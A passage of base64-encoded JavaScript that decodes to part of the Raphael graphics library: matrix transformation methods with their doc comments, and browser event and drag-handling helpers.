gW1t0aGlzLmEsIHRoaXMuYywgdGhpcy5lXSwgW3RoaXMuYiwgdGhpcy5kLCB0aGlzLmZdLCBbMCwgMCwgMV1dLFxuICAgICAgICAgICAgICAgIG1hdHJpeCA9IFtbYSwgYywgZV0sIFtiLCBkLCBmXSwgWzAsIDAsIDFdXSxcbiAgICAgICAgICAgICAgICB4LCB5LCB6LCByZXM7XG5cbiAgICAgICAgICAgIGlmIChhICYmIGEgaW5zdGFuY2VvZiBNYXRyaXgpIHtcbiAgICAgICAgICAgICAgICBtYXRyaXggPSBbW2EuYSwgYS5jLCBhLmVdLCBbYS5iLCBhLmQsIGEuZl0sIFswLCAwLCAxXV07XG4gICAgICAgICAgICB9XG5cbiAgICAgICAgICAgIGZvciAoeCA9IDA7IHggPCAzOyB4KyspIHtcbiAgICAgICAgICAgICAgICBmb3IgKHkgPSAwOyB5IDwgMzsgeSsrKSB7XG4gICAgICAgICAgICAgICAgICAgIHJlcyA9IDA7XG4gICAgICAgICAgICAgICAgICAgIGZvciAoeiA9IDA7IHogPCAzOyB6KyspIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIHJlcyArPSBtW3hdW3pdICogbWF0cml4W3pdW3ldO1xuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIG91dFt4XVt5XSA9IHJlcztcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICB0aGlzLmEgPSBvdXRbMF1bMF07XG4gICAgICAgICAgICB0aGlzLmIgPSBvdXRbMV1bMF07XG4gICAgICAgICAgICB0aGlzLmMgPSBvdXRbMF1bMV07XG4gICAgICAgICAgICB0aGlzLmQgPSBvdXRbMV1bMV07XG4gICAgICAgICAgICB0aGlzLmUgPSBvdXRbMF1bMl07XG4gICAgICAgICAgICB0aGlzLmYgPSBvdXRbMV1bMl07XG4gICAgICAgIH07XG4gICAgICAgIC8qXFxcbiAgICAgICAgICogTWF0cml4LmludmVydFxuICAgICAgICAgWyBtZXRob2QgXVxuICAgICAgICAgKipcbiAgICAgICAgICogUmV0dXJucyBpbnZlcnRlZCB2ZXJzaW9uIG9mIHRoZSBtYXRyaXhcbiAgICAgICAgID0gKG9iamVjdCkgQE1hdHJpeFxuICAgICAgICBcXCovXG4gICAgICAgIG1hdHJpeHByb3RvLmludmVydCA9IGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgIHZhciBtZSA9IHRoaXMsXG4gICAgICAgICAgICAgICAgeCA9IG1lLmEgKiBtZS5kIC0gbWUuYiAqIG1lLmM7XG4gICAgICAgICAgICByZXR1cm4gbmV3IE1hdHJpeChtZS5kIC8geCwgLW1lLmIgLyB4LCAtbWUuYyAvIHgsIG1lLmEgLyB4LCAobWUuYyAqIG1lLmYgLSBtZS5kICogbWUuZSkgLyB4LCAobWUuYiAqIG1lLmUgLSBtZS5hICogbWUuZikgLyB4KTtcbiAgICAgICAgfTtcbiAgICAgICAgLypcXFxuICAgICAgICAgKiBNYXRyaXguY2xvbmVcbiAgICAgICAgIFsgbWV0aG9kIF1cbiAgICAgICAgICoqXG4gICAgICAgICAqIFJldHVybnMgY29weSBvZiB0aGUgbWF0cml4XG4gICAgICAgICA9IChvYmplY3QpIEBNYXRyaXhcbiAgICAgICAgXFwqL1xuICAgICAgICBtYXRyaXhwcm90by5jbG9uZSA9IGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgIHJldHVybiBuZXcgTWF0cml4KHRoaXMuYSwgdGhpcy5iLCB0aGlzLmMsIHRoaXMuZCwgdGhpcy5lLCB0aGlzLmYpO1xuICAgICAgICB9O1xuICAgICAgICAvKlxcXG4gICAgICAgICAqIE1hdHJpeC50cmFuc2xhdGVcbiAgICAgICAgIFsgbWV0aG9kIF1cbiAgICAgICAgICoqXG4gICAgICAgICAqIFRyYW5zbGF0ZSB0aGUgbWF0cml4XG4gICAgICAgICA+IFBhcmFtZXRlcnNcbiAgICAgICAgIC0geCAobnVtYmVyKVxuICAgICAgICAgLSB5IChudW1iZXIpXG4gICAgICAgIFxcKi9cbiAgICAgICAgbWF0cml4cHJvdG8udHJhbnNsYXRlID0gZnVuY3Rpb24gKHgsIHkpIHtcbiAgICAgICAgICAgIHRoaXMuYWRkKDEsIDAsIDAsIDEsIHgsIHkpO1xuICAgICAgICB9O1xuICAgICAgICAvKlxcXG4gICAgICAgICAqIE1hdHJpeC5zY2FsZVxuICAgICAgICAgWyBtZXRob2QgXVxuICAgICAgICAgKipcbiAgICAgICAgICogU2NhbGVzIHRoZSBtYXRyaXhcbiAgICAgICAgID4gUGFyYW1ldGVyc1xuICAgICAgICAgLSB4IChudW1iZXIpXG4gICAgICAgICAtIHkgKG51bWJlcikgI29wdGlvbmFsXG4gICAgICAgICAtIGN4IChudW1iZXIpICNvcHRpb25hbFxuICAgICAgICAgLSBjeSAobnVtYmVyKSAjb3B0aW9uYWxcbiAgICAgICAgXFwqL1xuICAgICAgICBtYXRyaXhwcm90by5zY2FsZSA9IGZ1bmN0aW9uICh4LCB5LCBjeCwgY3kpIHtcbiAgICAgICAgICAgIHkgPT0gbnVsbCAmJiAoeSA9IHgpO1xuICAgICAgICAgICAgKGN4IHx8IGN5KSAmJiB0aGlzLmFkZCgxLCAwLCAwLCAxLCBjeCwgY3kpO1xuICAgICAgICAgICAgdGhpcy5hZGQoeCwgMCwgMCwgeSwgMCwgMCk7XG4gICAgICAgICAgICAoY3ggfHwgY3kpICYmIHRoaXMuYWRkKDEsIDAsIDAsIDEsIC1jeCwgLWN5KTtcbiAgICAgICAgfTtcbiAgICAgICAgLypcXFxuICAgICAgICAgKiBNYXRyaXgucm90YXRlXG4gICAgICAgICBbIG1ldGhvZCBdXG4gICAgICAgICAqKlxuICAgICAgICAgKiBSb3RhdGVzIHRoZSBtYXRyaXhcbiAgICAgICAgID4gUGFyYW1ldGVyc1xuICAgICAgICAgLSBhIChudW1iZXIpXG4gICAgICAgICAtIHggKG51bWJlcilcbiAgICAgICAgIC0geSAobnVtYmVyKVxuICAgICAgICBcXCovXG4gICAgICAgIG1hdHJpeHByb3RvLnJvdGF0ZSA9IGZ1bmN0aW9uIChhLCB4LCB5KSB7XG4gICAgICAgICAgICBhID0gUi5yYWQoYSk7XG4gICAgICAgICAgICB4ID0geCB8fCAwO1xuICAgICAgICAgICAgeSA9IHkgfHwgMDtcbiAgICAgICAgICAgIHZhciBjb3MgPSArbWF0aC5jb3MoYSkudG9GaXhlZCg5KSxcbiAgICAgICAgICAgICAgICBzaW4gPSArbWF0aC5zaW4oYSkudG9GaXhlZCg5KTtcbiAgICAgICAgICAgIHRoaXMuYWRkKGNvcywgc2luLCAtc2luLCBjb3MsIHgsIHkpO1xuICAgICAgICAgICAgdGhpcy5hZGQoMSwgMCwgMCwgMSwgLXgsIC15KTtcbiAgICAgICAgfTtcbiAgICAgICAgLypcXFxuICAgICAgICAgKiBNYXRyaXgueFxuICAgICAgICAgWyBtZXRob2QgXVxuICAgICAgICAgKipcbiAgICAgICAgICogUmV0dXJuIHggY29vcmRpbmF0ZSBmb3IgZ2l2ZW4gcG9pbnQgYWZ0ZXIgdHJhbnNmb3JtYXRpb24gZGVzY3JpYmVkIGJ5IHRoZSBtYXRyaXguIFNlZSBhbHNvIEBNYXRyaXgueVxuICAgICAgICAgPiBQYXJhbWV0ZXJzXG4gICAgICAgICAtIHggKG51bWJlcilcbiAgICAgICAgIC0geSAobnVtYmVyKVxuICAgICAgICAgPSAobnVtYmVyKSB4XG4gICAgICAgIFxcKi9cbiAgICAgICAgbWF0cml4cHJvdG8ueCA9IGZ1bmN0aW9uICh4LCB5KSB7XG4gICAgICAgICAgICByZXR1cm4geCAqIHRoaXMuYSArIHkgKiB0aGlzLmMgKyB0aGlzLmU7XG4gICAgICAgIH07XG4gICAgICAgIC8qXFxcbiAgICAgICAgICogTWF0cml4LnlcbiAgICAgICAgIFsgbWV0aG9kIF1cbiAgICAgICAgICoqXG4gICAgICAgICAqIFJldHVybiB5IGNvb3JkaW5hdGUgZm9yIGdpdmVuIHBvaW50IGFmdGVyIHRyYW5zZm9ybWF0aW9uIGRlc2NyaWJlZCBieSB0aGUgbWF0cml4LiBTZWUgYWxzbyBATWF0cml4LnhcbiAgICAgICAgID4gUGFyYW1ldGVyc1xuICAgICAgICAgLSB4IChudW1iZXIpXG4gICAgICAgICAtIHkgKG51bWJlcilcbiAgICAgICAgID0gKG51bWJlcikgeVxuICAgICAgICBcXCovXG4gICAgICAgIG1hdHJpeHByb3RvLnkgPSBmdW5jdGlvbiAoeCwgeSkge1xuICAgICAgICAgICAgcmV0dXJuIHggKiB0aGlzLmIgKyB5ICogdGhpcy5kICsgdGhpcy5mO1xuICAgICAgICB9O1xuICAgICAgICBtYXRyaXhwcm90by5nZXQgPSBmdW5jdGlvbiAoaSkge1xuICAgICAgICAgICAgcmV0dXJuICt0aGlzW1N0ci5mcm9tQ2hhckNvZGUoOTcgKyBpKV0udG9GaXhlZCg0KTtcbiAgICAgICAgfTtcbiAgICAgICAgbWF0cml4cHJvdG8udG9TdHJpbmcgPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICByZXR1cm4gUi5zdmcgP1xuICAgICAgICAgICAgICAgIFwibWF0cml4KFwiICsgW3RoaXMuZ2V0KDApLCB0aGlzLmdldCgxKSwgdGhpcy5nZXQoMiksIHRoaXMuZ2V0KDMpLCB0aGlzLmdldCg0KSwgdGhpcy5nZXQoNSldLmpvaW4oKSArIFwiKVwiIDpcbiAgICAgICAgICAgICAgICBbdGhpcy5nZXQoMCksIHRoaXMuZ2V0KDIpLCB0aGlzLmdldCgxKSwgdGhpcy5nZXQoMyksIDAsIDBdLmpvaW4oKTtcbiAgICAgICAgfTtcbiAgICAgICAgbWF0cml4cHJvdG8udG9GaWx0ZXIgPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICByZXR1cm4gXCJwcm9naWQ6RFhJbWFnZVRyYW5zZm9ybS5NaWNyb3NvZnQuTWF0cml4KE0xMT1cIiArIHRoaXMuZ2V0KDApICtcbiAgICAgICAgICAgICAgICBcIiwgTTEyPVwiICsgdGhpcy5nZXQoMikgKyBcIiwgTTIxPVwiICsgdGhpcy5nZXQoMSkgKyBcIiwgTTIyPVwiICsgdGhpcy5nZXQoMykgK1xuICAgICAgICAgICAgICAgIFwiLCBEeD1cIiArIHRoaXMuZ2V0KDQpICsgXCIsIER5PVwiICsgdGhpcy5nZXQoNSkgKyBcIiwgc2l6aW5nbWV0aG9kPSdhdXRvIGV4cGFuZCcpXCI7XG4gICAgICAgIH07XG4gICAgICAgIG1hdHJpeHByb3RvLm9mZnNldCA9IGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgIHJldHVybiBbdGhpcy5lLnRvRml4ZWQoNCksIHRoaXMuZi50b0ZpeGVkKDQpXTtcbiAgICAgICAgfTtcbiAgICAgICAgZnVuY3Rpb24gbm9ybShhKSB7XG4gICAgICAgICAgICByZXR1cm4gYVswXSAqIGFbMF0gKyBhWzFdICogYVsxXTtcbiAgICAgICAgfVxuICAgICAgICBmdW5jdGlvbiBub3JtYWxpemUoYSkge1xuICAgICAgICAgICAgdmFyIG1hZyA9IG1hdGguc3FydChub3JtKGEpKTtcbiAgICAgICAgICAgIGFbMF0gJiYgKGFbMF0gLz0gbWFnKTtcbiAgICAgICAgICAgIGFbMV0gJiYgKGFbMV0gLz0gbWFnKTtcbiAgICAgICAgfVxuICAgICAgICAvKlxcXG4gICAgICAgICAqIE1hdHJpeC5zcGxpdFxuICAgICAgICAgWyBtZXRob2QgXVxuICAgICAgICAgKipcbiAgICAgICAgICogU3BsaXRzIG1hdHJpeCBpbnRvIHByaW1pdGl2ZSB0cmFuc2Zvcm1hdGlvbnNcbiAgICAgICAgID0gKG9iamVjdCkgaW4gZm9ybWF0OlxuICAgICAgICAgbyBkeCAobnVtYmVyKSB0cmFuc2xhdGlvbiBieSB4XG4gICAgICAgICBvIGR5IChudW1iZXIpIHRyYW5zbGF0aW9uIGJ5IHlcbiAgICAgICAgIG8gc2NhbGV4IChudW1iZXIpIHNjYWxlIGJ5IHhcbiAgICAgICAgIG8gc2NhbGV5IChudW1iZXIpIHNjYWxlIGJ5IHlcbiAgICAgICAgIG8gc2hlYXIgKG51bWJlcikgc2hlYXJcbiAgICAgICAgIG8gcm90YXRlIChudW1iZXIpIHJvdGF0aW9uIGluIGRlZ1xuICAgICAgICAgbyBpc1NpbXBsZSAoYm9vbGVhbikgY291bGQgaXQgYmUgcmVwcmVzZW50ZWQgdmlhIHNpbXBsZSB0cmFuc2Zvcm1hdGlvbnNcbiAgICAgICAgXFwqL1xuICAgICAgICBtYXRyaXhwcm90by5zcGxpdCA9IGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgIHZhciBvdXQgPSB7fTtcbiAgICAgICAgICAgIC8vIHRyYW5zbGF0aW9uXG4gICAgICAgICAgICBvdXQuZHggPSB0aGlzLmU7XG4gICAgICAgICAgICBvdXQuZHkgPSB0aGlzLmY7XG5cbiAgICAgICAgICAgIC8vIHNjYWxlIGFuZCBzaGVhclxuICAgICAgICAgICAgdmFyIHJvdyA9IFtbdGhpcy5hLCB0aGlzLmNdLCBbdGhpcy5iLCB0aGlzLmRdXTtcbiAgICAgICAgICAgIG91dC5zY2FsZXggPSBtYXRoLnNxcnQobm9ybShyb3dbMF0pKTtcbiAgICAgICAgICAgIG5vcm1hbGl6ZShyb3dbMF0pO1xuXG4gICAgICAgICAgICBvdXQuc2hlYXIgPSByb3dbMF1bMF0gKiByb3dbMV1bMF0gKyByb3dbMF1bMV0gKiByb3dbMV1bMV07XG4gICAgICAgICAgICByb3dbMV0gPSBbcm93WzFdWzBdIC0gcm93WzBdWzBdICogb3V0LnNoZWFyLCByb3dbMV1bMV0gLSByb3dbMF1bMV0gKiBvdXQuc2hlYXJdO1xuXG4gICAgICAgICAgICBvdXQuc2NhbGV5ID0gbWF0aC5zcXJ0KG5vcm0ocm93WzFdKSk7XG4gICAgICAgICAgICBub3JtYWxpemUocm93WzFdKTtcbiAgICAgICAgICAgIG91dC5zaGVhciAvPSBvdXQuc2NhbGV5O1xuXG4gICAgICAgICAgICAvLyByb3RhdGlvblxuICAgICAgICAgICAgdmFyIHNpbiA9IC1yb3dbMF1bMV0sXG4gICAgICAgICAgICAgICAgY29zID0gcm93WzFdWzFdO1xuICAgICAgICAgICAgaWYgKGNvcyA8IDApIHtcbiAgICAgICAgICAgICAgICBvdXQucm90YXRlID0gUi5kZWcobWF0aC5hY29zKGNvcykpO1xuICAgICAgICAgICAgICAgIGlmIChzaW4gPCAwKSB7XG4gICAgICAgICAgICAgICAgICAgIG91dC5yb3RhdGUgPSAzNjAgLSBvdXQucm90YXRlO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgb3V0LnJvdGF0ZSA9IFIuZGVnKG1hdGguYXNpbihzaW4pKTtcbiAgICAgICAgICAgIH1cblxuICAgICAgICAgICAgb3V0LmlzU2ltcGxlID0gIStvdXQuc2hlYXIudG9GaXhlZCg5KSAmJiAob3V0LnNjYWxleC50b0ZpeGVkKDkpID09IG91dC5zY2FsZXkudG9GaXhlZCg5KSB8fCAhb3V0LnJvdGF0ZSk7XG4gICAgICAgICAgICBvdXQuaXNTdXBlclNpbXBsZSA9ICErb3V0LnNoZWFyLnRvRml4ZWQoOSkgJiYgb3V0LnNjYWxleC50b0ZpeGVkKDkpID09IG91dC5zY2FsZXkudG9GaXhlZCg5KSAmJiAhb3V0LnJvdGF0ZTtcbiAgICAgICAgICAgIG91dC5ub1JvdGF0aW9uID0gIStvdXQuc2hlYXIudG9GaXhlZCg5KSAmJiAhb3V0LnJvdGF0ZTtcbiAgICAgICAgICAgIHJldHVybiBvdXQ7XG4gICAgICAgIH07XG4gICAgICAgIC8qXFxcbiAgICAgICAgICogTWF0cml4LnRvVHJhbnNmb3JtU3RyaW5nXG4gICAgICAgICBbIG1ldGhvZCBdXG4gICAgICAgICAqKlxuICAgICAgICAgKiBSZXR1cm4gdHJhbnNmb3JtIHN0cmluZyB0aGF0IHJlcHJlc2VudHMgZ2l2ZW4gbWF0cml4XG4gICAgICAgICA9IChzdHJpbmcpIHRyYW5zZm9ybSBzdHJpbmdcbiAgICAgICAgXFwqL1xuICAgICAgICBtYXRyaXhwcm90by50b1RyYW5zZm9ybVN0cmluZyA9IGZ1bmN0aW9uIChzaG9ydGVyKSB7XG4gICAgICAgICAgICB2YXIgcyA9IHNob3J0ZXIgfHwgdGhpc1tzcGxpdF0oKTtcbiAgICAgICAgICAgIGlmIChzLmlzU2ltcGxlKSB7XG4gICAgICAgICAgICAgICAgcy5zY2FsZXggPSArcy5zY2FsZXgudG9GaXhlZCg0KTtcbiAgICAgICAgICAgICAgICBzLnNjYWxleSA9ICtzLnNjYWxleS50b0ZpeGVkKDQpO1xuICAgICAgICAgICAgICAgIHMucm90YXRlID0gK3Mucm90YXRlLnRvRml4ZWQoNCk7XG4gICAgICAgICAgICAgICAgcmV0dXJuICAocy5keCB8fCBzLmR5ID8gXCJ0XCIgKyBbcy5keCwgcy5keV0gOiBFKSArXG4gICAgICAgICAgICAgICAgICAgICAgICAocy5zY2FsZXggIT0gMSB8fCBzLnNjYWxleSAhPSAxID8gXCJzXCIgKyBbcy5zY2FsZXgsIHMuc2NhbGV5LCAwLCAwXSA6IEUpICtcbiAgICAgICAgICAgICAgICAgICAgICAgIChzLnJvdGF0ZSA/IFwiclwiICsgW3Mucm90YXRlLCAwLCAwXSA6IEUpO1xuICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICByZXR1cm4gXCJtXCIgKyBbdGhpcy5nZXQoMCksIHRoaXMuZ2V0KDEpLCB0aGlzLmdldCgyKSwgdGhpcy5nZXQoMyksIHRoaXMuZ2V0KDQpLCB0aGlzLmdldCg1KV07XG4gICAgICAgICAgICB9XG4gICAgICAgIH07XG4gICAgfSkoTWF0cml4LnByb3RvdHlwZSk7XG5cbiAgICB2YXIgcHJldmVudERlZmF1bHQgPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgIHRoaXMucmV0dXJuVmFsdWUgPSBmYWxzZTtcbiAgICB9LFxuICAgIHByZXZlbnRUb3VjaCA9IGZ1bmN0aW9uICgpIHtcbiAgICAgICAgcmV0dXJuIHRoaXMub3JpZ2luYWxFdmVudC5wcmV2ZW50RGVmYXVsdCgpO1xuICAgIH0sXG4gICAgc3RvcFByb3BhZ2F0aW9uID0gZnVuY3Rpb24gKCkge1xuICAgICAgICB0aGlzLmNhbmNlbEJ1YmJsZSA9IHRydWU7XG4gICAgfSxcbiAgICBzdG9wVG91Y2ggPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgIHJldHVybiB0aGlzLm9yaWdpbmFsRXZlbnQuc3RvcFByb3BhZ2F0aW9uKCk7XG4gICAgfSxcbiAgICBnZXRFdmVudFBvc2l0aW9uID0gZnVuY3Rpb24gKGUpIHtcbiAgICAgICAgdmFyIHNjcm9sbFkgPSBnLmRvYy5kb2N1bWVudEVsZW1lbnQuc2Nyb2xsVG9wIHx8IGcuZG9jLmJvZHkuc2Nyb2xsVG9wLFxuICAgICAgICAgICAgc2Nyb2xsWCA9IGcuZG9jLmRvY3VtZW50RWxlbWVudC5zY3JvbGxMZWZ0IHx8IGcuZG9jLmJvZHkuc2Nyb2xsTGVmdDtcblxuICAgICAgICByZXR1cm4ge1xuICAgICAgICAgICAgeDogZS5jbGllbnRYICsgc2Nyb2xsWCxcbiAgICAgICAgICAgIHk6IGUuY2xpZW50WSArIHNjcm9sbFlcbiAgICAgICAgfTtcbiAgICB9LFxuICAgIGFkZEV2ZW50ID0gKGZ1bmN0aW9uICgpIHtcbiAgICAgICAgaWYgKGcuZG9jLmFkZEV2ZW50TGlzdGVuZXIpIHtcbiAgICAgICAgICAgIHJldHVybiBmdW5jdGlvbiAob2JqLCB0eXBlLCBmbiwgZWxlbWVudCkge1xuICAgICAgICAgICAgICAgIHZhciBmID0gZnVuY3Rpb24gKGUpIHtcbiAgICAgICAgICAgICAgICAgICAgdmFyIHBvcyA9IGdldEV2ZW50UG9zaXRpb24oZSk7XG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBmbi5jYWxsKGVsZW1lbnQsIGUsIHBvcy54LCBwb3MueSk7XG4gICAgICAgICAgICAgICAgfTtcbiAgICAgICAgICAgICAgICBvYmouYWRkRXZlbnRMaXN0ZW5lcih0eXBlLCBmLCBmYWxzZSk7XG5cbiAgICAgICAgICAgICAgICBpZiAoc3VwcG9ydHNUb3VjaCAmJiB0b3VjaE1hcFt0eXBlXSkge1xuICAgICAgICAgICAgICAgICAgICB2YXIgX2YgPSBmdW5jdGlvbiAoZSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHBvcyA9IGdldEV2ZW50UG9zaXRpb24oZSksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgb2xkZSA9IGU7XG5cbiAgICAgICAgICAgICAgICAgICAgICAgIGZvciAodmFyIGkgPSAwLCBpaSA9IGUudGFyZ2V0VG91Y2hlcyAmJiBlLnRhcmdldFRvdWNoZXMubGVuZ3RoOyBpIDwgaWk7IGkrKykge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChlLnRhcmdldFRvdWNoZXNbaV0udGFyZ2V0ID09IG9iaikge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlID0gZS50YXJnZXRUb3VjaGVzW2ldO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlLm9yaWdpbmFsRXZlbnQgPSBvbGRlO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlLnByZXZlbnREZWZhdWx0ID0gcHJldmVudFRvdWNoO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlLnN0b3BQcm9wYWdhdGlvbiA9IHN0b3BUb3VjaDtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgfVxuXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZm4uY2FsbChlbGVtZW50LCBlLCBwb3MueCwgcG9zLnkpO1xuICAgICAgICAgICAgICAgICAgICB9O1xuICAgICAgICAgICAgICAgICAgICBvYmouYWRkRXZlbnRMaXN0ZW5lcih0b3VjaE1hcFt0eXBlXSwgX2YsIGZhbHNlKTtcbiAgICAgICAgICAgICAgICB9XG5cbiAgICAgICAgICAgICAgICByZXR1cm4gZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICBvYmoucmVtb3ZlRXZlbnRMaXN0ZW5lcih0eXBlLCBmLCBmYWxzZSk7XG5cbiAgICAgICAgICAgICAgICAgICAgaWYgKHN1cHBvcnRzVG91Y2ggJiYgdG91Y2hNYXBbdHlwZV0pXG4gICAgICAgICAgICAgICAgICAgICAgICBvYmoucmVtb3ZlRXZlbnRMaXN0ZW5lcih0b3VjaE1hcFt0eXBlXSwgX2YsIGZhbHNlKTtcblxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTtcbiAgICAgICAgICAgICAgICB9O1xuICAgICAgICAgICAgfTtcbiAgICAgICAgfSBlbHNlIGlmIChnLmRvYy5hdHRhY2hFdmVudCkge1xuICAgICAgICAgICAgcmV0dXJuIGZ1bmN0aW9uIChvYmosIHR5cGUsIGZuLCBlbGVtZW50KSB7XG4gICAgICAgICAgICAgICAgdmFyIGYgPSBmdW5jdGlvbiAoZSkge1xuICAgICAgICAgICAgICAgICAgICBlID0gZSB8fCBnLndpbi5ldmVudDtcbiAgICAgICAgICAgICAgICAgICAgdmFyIHNjcm9sbFkgPSBnLmRvYy5kb2N1bWVudEVsZW1lbnQuc2Nyb2xsVG9wIHx8IGcuZG9jLmJvZHkuc2Nyb2xsVG9wLFxuICAgICAgICAgICAgICAgICAgICAgICAgc2Nyb2xsWCA9IGcuZG9jLmRvY3VtZW50RWxlbWVudC5zY3JvbGxMZWZ0IHx8IGcuZG9jLmJvZHkuc2Nyb2xsTGVmdCxcbiAgICAgICAgICAgICAgICAgICAgICAgIHggPSBlLmNsaWVudFggKyBzY3JvbGxYLFxuICAgICAgICAgICAgICAgICAgICAgICAgeSA9IGUuY2xpZW50WSArIHNjcm9sbFk7XG4gICAgICAgICAgICAgICAgICAgIGUucHJldmVudERlZmF1bHQgPSBlLnByZXZlbnREZWZhdWx0IHx8IHByZXZlbnREZWZhdWx0O1xuICAgICAgICAgICAgICAgICAgICBlLnN0b3BQcm9wYWdhdGlvbiA9IGUuc3RvcFByb3BhZ2F0aW9uIHx8IHN0b3BQcm9wYWdhdGlvbjtcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZuLmNhbGwoZWxlbWVudCwgZSwgeCwgeSk7XG4gICAgICAgICAgICAgICAgfTtcbiAgICAgICAgICAgICAgICBvYmouYXR0YWNoRXZlbnQoXCJvblwiICsgdHlwZSwgZik7XG4gICAgICAgICAgICAgICAgdmFyIGRldGFjaGVyID0gZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICBvYmouZGV0YWNoRXZlbnQoXCJvblwiICsgdHlwZSwgZik7XG4gICAgICAgICAgICAgICAgICAgIHJldHVybiB0cnVlO1xuICAgICAgICAgICAgICAgIH07XG4gICAgICAgICAgICAgICAgcmV0dXJuIGRldGFjaGVyO1xuICAgICAgICAgICAgfTtcbiAgICAgICAgfVxuICAgIH0pKCksXG4gICAgZHJhZyA9IFtdLFxuICAgIGRyYWdNb3ZlID0gZnVuY3Rpb24gKGUpIHtcbiAgICAgICAgdmFyIHggPSBlLmNsaWVudFgsXG4gICAgICAgICAgICB5ID0gZS5jbGllbnRZLFxuICAgICAgICAgICAgc2Nyb2xsWSA9IGcuZG9jLmRvY3VtZW50RWxlbWVudC5zY3JvbGxUb3AgfHwgZy5kb2MuYm9keS5zY3JvbGxUb3AsXG4gICAgICAgICAgICBzY3JvbGxYID0gZy5kb2MuZG9jdW1lbnRFbGVtZW50LnNjcm9sbExlZnQgfHwgZy5kb2MuYm9keS5zY3JvbGxMZWZ0LFxuICAgICAgICAgICAgZHJhZ2ksXG4gICAgICAgICAgICBqID0gZHJhZy5sZW5ndGg7XG4gICAgICAgIHdoaWxlIChqLS0pIHtcbiAgICAgICAgICAgIGRyYWdpID0gZHJhZ1tqXTtcbiAgICAgICAgICAgIGlmIChzdXBwb3J0c1RvdWNoICYmIGUudG91Y2hlcykge1xuICAgICAgICAgICAgICAgIHZhciBpID0gZS50b3VjaGVzLmxlbmd0aCxcbiAgICAgICAgICAgICAgICAgICAgdG91Y2g7XG4gICAgICAgICAgICAgICAgd2hpbGUgKGktLSkge1xuICAgICAgICAgICAgICAgICAgICB0b3VjaCA9IGUudG91Y2hlc1tpXTtcbiAgICAgICAgICAgICAgICAgICAgaWYgKHRvdWNoLmlkZW50aWZpZXIgPT0gZHJhZ2kuZWwuX2RyYWcuaWQpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIHggPSB0b3VjaC5jbGllbnRYO1xuICAgICAgICAgICAgICAgICAgICAgICAgeSA9IHRvdWNoLmNsaWVudFk7XG4gICAgICAgICAgICAgICAgICAgICAgICAoZS5vcmlnaW5hbEV2ZW50ID8gZS5vcmlnaW5hbEV2ZW50IDogZSkucHJldmVudERlZmF1bHQoKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICB2YXIgbm9kZSA9IGRyYWdpLmVsLm5vZGUsXG4gICAgICAgICAgICAgICAgbyxcbiAgICAgICAgICAgICAgICBuZXh0ID0gbm9kZS5uZXh0U2libGluZyxcbiAgICAgICAgICAgICAgICBwYXJlbnQgPSBub2RlLnBhcmVudE5vZGUsXG4gICAgICAgICAgICAgICAgZGlzcGxheSA9IG5vZGUuc3R5bGUuZGlzcGxheTtcbiAgICAgICAgICAgIGcud2luLm9wZXJhICYmIHBhcmVudC5yZW1vdmVDaGlsZChub2RlKTtcbiAgICAgICAgICAgIG5vZGUuc3R5bGUuZGlzcGxheSA9IFwibm9uZVwiO1xuICAgICAgICAgICAgbyA9IGRyYWdpLmVsLnBhcGVyLmdldEVsZW1lbnRCeVBvaW50KHgsIHkpO1xuICAgICAgICAgICAgbm9kZS5zdHlsZS5kaXNwbGF5ID0gZGlzcGxheTtcbiAgICAgICAgICAgIGcud2luLm9wZXJhICYmIChuZXh0ID8gcGFyZW50Lmluc2VydEJlZm9yZShub2RlLCBuZXh0KSA6IHBhcmVudC5hcHBlbmRDaGlsZChub2RlKSk7XG4gICAgICAgICAgICBvICYmIGV2ZShcInJhcGhhZWwuZHJhZy5vdmVyLlwiICsgZHJhZ2kuZWwuaWQsIGRyYWdpLmVsLCBvKTtcbiAgICAgICAgICAgIHggKz0gc2Nyb2xsWDtcbiAgICAgICAgICAgIHkgKz0gc2Nyb2xsWTtcbiAgICAgICAgICAgIGV2ZShcInJhcGhhZWwuZHJhZy5tb3ZlLlwiICsgZHJhZ2kuZWwuaWQsIGRyYWdpLm1vdmVfc2NvcGUgfHwgZHJhZ2kuZWwsIHggLSBkcmFnaS5lbC5fZHJhZy54LCB5IC0gZHJhZ2kuZWwuX2RyYWcueSwgeCwgeSwgZSk7XG4gICAgICAgIH1cbiAgICB9LFxuICAgIGRyYWdVcCA9I